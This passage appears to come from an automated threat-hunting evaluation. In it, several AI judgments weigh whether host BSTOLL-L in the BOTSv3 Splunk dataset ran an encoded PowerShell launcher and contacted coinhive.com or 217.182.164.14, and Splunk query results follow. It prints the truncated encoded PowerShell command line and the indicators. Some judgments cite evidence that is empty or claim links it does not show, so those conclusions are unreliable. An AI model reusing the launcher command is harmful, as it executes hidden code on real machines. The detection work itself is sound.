> The evidence shows multiple instances of PowerShell execution (processes#2, #11, #12) on BSTOLL-L during the specified timeframe. Crucially, processes#12 includes a PowerShell command line starting with "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc ..., indicating obfuscation through encoding. Additionally, processes#11 shows an empty cmdline field (implying potential evasion) alongside AppLocker events (code=8002), suggesting blocked or hidden execution attempts. Network evidence (uncategorised#12 & #13) confirms DNS resolutions for coinhive.com (28 times) and TCP/IP connections to 217.182.164.14 (3 times), directly linking the host's activity to the C2 infrastructure mentioned in the hypothesis.

- (no observations)

citations: `processes#11, processes#12, uncategorised#12, uncategorised#13`

**shown #11** — stance `inconclusive`, confidence 0.65

> Evidence shows PowerShell execution with encoded commands (processes#12) and DNS lookups/resolutions for coinhive.com (uncategorised#13), suggesting potential C2 activity. However, AppLocker failures (processes#11) lack malicious context, and the file hash reputation remains unconfirmed (reputation#1). No direct link exists between the PowerShell activity and the specified malware hash or C2 IP.

- PowerShell execution with encoded commands (processes#12)

citations: `processes#12, uncategorised#13`

**shown #12** — stance `inconclusive`, confidence 0.65

> The evidence shows encoded PowerShell execution (processes#12, #13) consistent with the hypothesis, but lacks definitive proof of the specified malware hash (e2ac36894c2560d2b277ff9618b76c8c) or C2 communication to 217.182.164.14/coinhive.com. The AppLocker events (processes#8, #10) indicate unusual activity but don't confirm malicious intent. Reputation checks (#1) show no known threats, weakening the malware attribution.

- Encoded PowerShell command executed by BudStoll [processes#12]

citations: `processes#12, processes#13`

**shown #13** — stance `supports`, confidence 0.65

> Multiple encoded PowerShell executions (processes#12) by user BudStoll align with initial access techniques, while network flows involving the specified IP (uncategorised#12) support C2 activity. The file's neutral reputation does not contradict the hypothesis.

- Encoded PowerShell commands observed at 11:59 AM and 1:28 PM on 2018-08-20 ([processes#12]).

citations: `processes#12, uncategorised#12`

**shown #14** — stance `supports`, confidence 0.85

> The evidence demonstrates encoded PowerShell execution by user BudStoll (matching bostoll) with an encoded command line, characteristic of malware delivery. Simultaneously, it shows repeated DNS lookups for coinhive.com resolving to 217.182.164.14, indicating active communication with the suspected C2 infrastructure.

- PowerShell execution with encoded command line [processes#12]
- DNS resolutions for coinhive.com pointing to 217.182.164.14 [uncategorised#13]

citations: `processes#12, uncategorised#13`

**shown #15** — stance `supports`, confidence 0.65

> The evidence shows encoded PowerShell commands (processes#12) originating from user BudStoll on host BSTOLL-L interacting with external infrastructure matching the C2 indicators specified in the hypothesis. These encoded commands are a strong indicator of obfuscated malicious activity. Combined with confirmed outbound network connections to 217.182.164.14 (uncategorised#12) and coinhive.com (uncategorised#13), this pattern aligns with the described compromise scenario.

- Encoded PowerShell execution: processes#12 contains suspicious base64-encoded commands (cmdline="... -enc ...").
- Outbound C2 traffic: uncategorised#12 confirms connections to 217.182.164.14; uncategorised#13 confirms DNS lookups for coinhive.com.

citations: `processes#12, uncategorised#12, uncategorised#13`

**blind #1**, confidence 0.85

> Absence of reputation scoring despite multiple identical entries implies incomplete verification or evasion of detection systems.

- An unknown file hash (e2ac36894c2560d2b277ff9618b76c8c) lacks assigned reputation scores across all categories (malicious, suspicious, harmless), indicating unverified trustworthiness. [reputation#1]

citations: `reputation#1`

**blind #2**, confidence 0.95

> Multiple indicators point toward suspicious activity: encoded PowerShell commands suggest evasion techniques, abnormal conhost.exe usage implies potential command injection, and DNS requests to a known cryptomining domain indicate possible infection.

- Obfuscated PowerShell execution [processes#12]
- Conhost.exe child process spawning from svchost.exe [processes#11]
- DNS traffic to coinhive.com [uncategorised#13]

citations: `processes#11, processes#12, uncategorised#13`

**blind #3**, confidence 0.85

> The -enc flag in the command line suggests an attempt to conceal malicious code, and spawning from a legitimate process (browser broker) violates LOLBIN principles.

- Encoded PowerShell Command Executed via Browser Process: A PowerShell process (powershell.exe) executed an encoded command (-enc parameter) from browser_broker.exe, indicating potential obfuscation of malicious activity. [processes#12]

citations: `processes#12`

**blind #4**, confidence 0.95

> The evidence shows a PowerShell process executing an encoded command (-enc ...). Encoding is commonly used to obfuscate malicious scripts, though the specific content requires further analysis.

- An encoded PowerShell command was executed. [processes#12]

citations: `processes#12`

**blind #5**, confidence 0.95

> The evidence shows clear indicators of command obfuscation via PowerShell and outbound network traffic to a known malicious IP, while other process/activity checks yielded no actionable results.

- Encoded PowerShell Command Execution: Multiple instances of powershell.exe executing base64-encoded commands ([processes#12](https://example.com/processes#12)).
- Suspicious Connections to External IP: Connections to 217.182.164.14 associated with coinhive.com activity ([uncategorised#12](https://example.com/uncategorised#12)).

citations: `processes#12, uncategorised#12`

**blind #6**, confidence 0.85

> Evidence shows two encoded PowerShell commands (SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApA) executed from browser_broker.exe. Encoding suggests obfuscation, a common technique for hiding malicious payloads.

- Encoded PowerShell commands executed via browser_broker.exe [processes#12]

citations: `processes#12`

**blind #7**, confidence 0.95

> The encoded PowerShell commands are a known obfuscation technique, and DNS lookups for coinhive.com (a known crypto-miner domain) paired with connections to the same IP address strongly indicate potential cryptomining activity.

- Evidence shows encoded PowerShell command lines in processes#12.
- Multiple DNS lookups for coinhive.com exist in uncategorised#13.
- Connections from BSTOLL-L to 217.182.164.14 are recorded in uncategorised#12.

citations: `processes#12, uncategorised#12, uncategorised#13`

**blind #8**, confidence 0.85

> The hash was specifically queried for reputation, indicating it's a candidate for further investigation despite current uncertainty.

- A file hash e2ac36894c2560d2b277ff9618b76c8c has been analyzed by VirusTotal but remains classified as UNKNOWN, lacking definitive malicious or suspicious flags [reputation#1].

citations: `reputation#1`

**blind #9**, confidence 0.85

> The encoded PowerShell commands are highly suspicious due to their obfuscation technique. The Coinhive domain appears in multiple unclassified logs suggesting potential cryptojacking activity. Both findings require urgent investigation despite lacking definitive malicious indicators.

- Evidence of encoded PowerShell commands [processes#12]
- Detection of the Coinhive domain in DNS and syslog traffic [uncategorised#13]

citations: `processes#12, uncategorised#13`

**blind #10**, confidence 1.00

> The encoded PowerShell command line (evidenced by -enc parameter) is a classic indicator of obfuscation used to hide malicious payloads.

- A Windows PowerShell process executed with an encoded command line, suggesting obfuscation. [processes#12]

citations: `processes#12`

**blind #11**, confidence 0.85

> The encoded PowerShell command is a classic indicator of obfuscation commonly used by adversaries to execute arbitrary scripts or commands while evading detection. Its execution via browser_broker.exe suggests potential abuse of a legitimate process.

- An encoded PowerShell command executed via browser_broker.exe using the -enc parameter [processes#12]

citations: `processes#12`

**blind #12**, confidence 0.85

> The command line uses the -enc flag to execute obfuscated code, which is a common technique for hiding malicious payloads. While the exact content is truncated, the presence of encoding combined with the absence of benign context indicates potential malicious intent.

- An encoded PowerShell command was executed with suspicious parameters [processes#12].

citations: `processes#12`

**blind #13**, confidence 0.75

> The PowerShell executions feature encoded commands (-enc) without visible arguments, suggesting obfuscation. The presence of DNS queries for coinhive.com correlates with known cryptomining activity. Though no direct malicious verdict exists for the file hash, the combination of encoded PowerShell and crypto-mining-related network activity constitutes elevated risk.

- [reputation#1] indicates a file hash associated with the domain coinhive.com exists but lacks explicit malicious, suspicious, or harmless classification (rep=undefined).
- [processes#12] shows two instances of encoded PowerShell commands executed via browser_broker.exe:
- First command: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApA
- Second command: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApA.
- [uncategorised#13] shows DNS queries for coinhive.com across stream:dns (28 records) and syslog (6 records) logs.

citations: `processes#12, reputation#1, uncategorised#13`

**blind #14**, confidence 0.95

> Explicitly shows obfuscated PowerShell scripts (-enc parameter) being run by a legitimate process, consistent with living-off-the-land binary abuse for payload execution. The high volume of similar events strengthens suspicion.

- [processes#12] contains two encoded PowerShell commands executed via browser_broker.exe [processes#12]

citations: `processes#12`

**blind #15**, confidence 0.95

> Unknown file hashes lacking classification from VirusTotal or similar services require scrutiny as potential malicious artifacts.

- The file hash e2ac36894c2560d2b277ff9618b76c8c is listed as "unknown" in both entries of reputation#1.

citations: `reputation#1`

<details><summary>Evidence this domain was shown</summary>

```
# reputation#1 · source=virustotal · indicators=2
file_hash=e2ac36894c2560d2b277ff9618b76c8c unknown mal=0 susp=0 harmless=0 rep=-
file_hash=e2ac36894c2560d2b277ff9618b76c8c unknown mal=0 susp=0 harmless=0 rep=-

# processes#1 · query="index=botsv3 (host="BSTOLL-L" OR user="bostoll") sourcetype="WinEventLog:Sysmon" EventCode=1 earliest=1534723200 latest=1534809600 | stats count by host, User, …" · rows=0
(no rows returned)

# processes#2 · query="index=botsv3 (host="BSTOLL-L" OR user="bostoll") powershell earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=5
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=21
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=2
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=6
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=30
- host=BSTOLL-L user=- process=- parent=- code=- cmdline=- count=2

# processes#3 · query="index=botsv3 (host="BSTOLL-L" OR user="bostoll") (sourcetype="WinEventLog:Security" OR sourcetype="XmlWinEventLog:Security") EventCode=4688 earliest=1534723200 …" · rows=0
(no rows returned)

# processes#4 · query="index=botsv3 host="BSTOLL-L" sourcetype="xmlwineventlog" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 earliest=1534723200 latest=153480…" · rows=0
(no rows returned)

# processes#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="PerfmonMk:Process" powershell earliest=1534723200 latest=1534809600 | stats count by host, Name, ID, ParentProcessID" · rows=0
(no rows returned)

# processes#6 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" powershell earliest=1534723200 latest=1534809600 | stats count by host, Even…" · rows=6
- host=BSTOLL-L user=- process=- parent=- code=4659 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4663 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4688 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4688 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4689 cmdline=- count=1
- host=BSTOLL-L user=- process=- parent=- code=4689 cmdline=- count=1

# processes#7 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinHostMon" source="service" earliest=1534723200 latest=1534809600 | stats count by host, Name, DisplayName, State, Pat…" · rows=0
(no rows returned)

# processes#8 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | table…" · rows=50
2018-08-20T17:07:34.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T17:04:24.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:45.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:35.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:35.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:33.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:18.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:17.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:14.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:58:13.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:52:28.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T16:51:04.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:41:29.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:40:48.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:40:46.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:40:37.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
2018-08-20T15:33:57.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8002 cmdline=-
… (30 more rows not shown)

# processes#9 · query="index=botsv3 host="BSTOLL-L" sourcetype="PerfmonMk:Process" earliest=1534723200 latest=1534809600 | stats count by Name, ID, ParentProcessID | sort -count" · rows=0
(no rows returned)

# processes#10 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" powershell earliest=1534723200 latest=1534809…" · rows=2
2018-08-20T13:28:40.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8004 cmdline=-
2018-08-20T11:59:48.000+02:00 host=BSTOLL-L user=NOT_TRANSLATED process=- parent=- code=8004 cmdline=-

# processes#11 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" (EventCode=4688 OR EventCode=4689) earliest=1534723200 latest=1534809600 | t…" · rows=100
2018-08-20T11:05:01.000+02:00 host=BSTOLL-L user=BudStoll process=- parent=- code=4689 cmdline=-
2018-08-20T11:05:01.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Windows\System32\backgroundTaskHost.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\svchost.exe parent=C:\Windows\System32\services.exe code=4688 cmdline=C:\Windows\system32\svchost.exe -k defragsvc
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\Defrag.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\Defrag.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Windows\system32\defrag.exe" -p 67c -s 00000000000003D0 -b C:
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=BudStoll process=- parent=- code=4689 cmdline=-
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BSTOLL-L$'] process=C:\Windows\System32\Speech_OneCore\common\SpeechModelDownload.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline=C:\Windows\system32\speech_onecore\common\SpeechModelDownload.exe
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Windows\System32\taskhostw.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline=taskhostw.exe Event
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe" -ServerName:Hx.IPC.Server
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2018.18051.17710.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2018.18051.17710.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe" -ServerName:App.AppXzst44mncqdg84v7sv6p7yznqwssy6f7f.mca
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', 'BudStoll'] process=C:\Program Files (x86)\Microsoft Office\root\Office16\officebackgroundtaskhandler.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files (x86)\Microsoft Office\root\Office16\officebackgroundtaskhandler.exe"
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeC2RClient.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline="C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe" /frequentupdate SCHEDULEDTASK displaylevel=False
2018-08-20T11:06:15.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\provtool.exe parent=C:\Windows\System32\svchost.exe code=4688 cmdline=C:\Windows\system32\ProvTool.exe /turn 5 /source LogonIdleTask
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\DiskSnapshot.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\servicing\TrustedInstaller.exe parent=C:\Windows\System32\services.exe code=4688 cmdline=C:\Windows\servicing\TrustedInstaller.exe
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['LOCAL SERVICE', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\sc.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1806.18062-0\MpCmdRun.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1806.18062-0\MpCmdRun.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1806.18062-0\MpCmdRun.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
2018-08-20T11:06:16.000+02:00 host=BSTOLL-L user=['BSTOLL-L$', '-'] process=C:\Windows\System32\conhost.exe parent=C:\Windows\System32\dmclient.exe code=4688 cmdline=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
… (80 more rows not shown)

# processes#12 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" EventCode=4688 powershell earliest=1534723200 latest=1534809600 | table _tim…" · rows=2
2018-08-20T11:59:48.000+02:00 host=BSTOLL-L user=['BudStoll', '-'] process=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe parent=C:\Windows\System32\browser_broker.exe code=- cmdline="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApA…
2018-08-20T13:28:40.000+02:00 host=BSTOLL-L user=['BudStoll', '-'] process=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe parent=C:\Windows\System32\browser_broker.exe code=- cmdline="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAUwBJAG8ATgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApA…

# processes#13 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Security" (EventCode=4688 OR EventCode=4689) earliest=1534723200 latest=1534809600 | t…" · rows=0
(no rows returned)

# uncategorised#1 · query="| tstats summariesonly=t count from datamodel=Authentication where (Authentication.user="bostoll" OR Authentication.src="BSTOLL-L" OR Authentication.dest="BSTOL…" · rows=0
(no rows returned)

# uncategorised#2 · query="index=botsv3 (user="bostoll" OR user="bstoll" OR user="bstoll@froth.ly" OR user="BudStoll") (sourcetype=linux_secure OR sourcetype=syslog OR sourcetype="access_…" · rows=0
(no rows returned)

# uncategorised#3 · query="| tstats summariesonly=t count from datamodel=Endpoint.Processes where Processes.dest="BSTOLL-L" OR Processes.user="bostoll" by Processes.dest, Processes.user, …" · rows=0
(no rows returned)

# uncategorised#4 · query="index=botsv3 host="BSTOLL-L" e2ac36894c2560d2b277ff9618b76c8c earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | stats…" · rows=0
(no rows returned)

# uncategorised#6 · query="index=botsv3 host="BSTOLL-L" "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#7 · query="index=botsv3 "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#8 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS by DNS.src, DNS.dest, DNS.query, DNS.answer, DNS.record_type earliest=-1s la…" · rows=0
(no rows returned)

# uncategorised#9 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffi…" · rows=0
(no rows returned)

# uncategorised#10 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic (All_Traffic.src="217.182.164.14" OR All_Traffic.dest="217.182.164.14")…" · rows=0
(no rows returned)

# uncategorised#11 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS (DNS.query="coinhive.com" OR DNS.answer="217.182.164.14") by DNS.src, DNS.de…" · rows=0
(no rows returned)

# uncategorised#12 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14" OR src="217.182.164.14" OR dest="217.182.164.14") | stats count by sourcetype, src_ip, dest_ip" · rows=3
sourcetype=WinEventLog src_ip=192.168.247.131 dest_ip=217.182.164.14 count=1
sourcetype=stream:ip src_ip=192.168.247.131 dest_ip=217.182.164.14 count=3
sourcetype=stream:tcp src_ip=192.168.247.131 dest_ip=217.182.164.14 count=2

# uncategorised#13 · query="index=botsv3 ("coinhive.com" OR "coinhive") | stats count by sourcetype" · rows=2
sourcetype=stream:dns count=28
sourcetype=syslog count=6

# uncategorised#14 · query="index=botsv3 sourcetype=WinEventLog (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by EventCode, src_ip, dest_ip, host, user" · rows=0
(no rows returned)

# uncategorised#15 · query="index=botsv3 sourcetype=syslog "coinhive.com" | stats count by host, src_ip, dest_ip, _raw" · rows=0
(no rows returned)
```

</details>
